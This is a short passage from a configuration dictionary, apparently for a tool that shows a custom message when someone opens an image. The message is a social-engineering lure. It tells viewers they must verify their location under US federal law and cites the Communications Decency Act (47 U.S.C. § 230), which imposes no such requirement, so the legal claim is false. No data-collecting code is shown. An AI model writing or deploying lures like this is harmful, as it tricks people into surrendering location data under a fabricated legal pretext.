...
config = {
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "Notice: To access this image, you must verify your location in accordance with United States federal law.
Under the Communications Decency Act (47 U.S.C. § 230), certain content restrictions apply based on your jurisdiction.", # Message to show
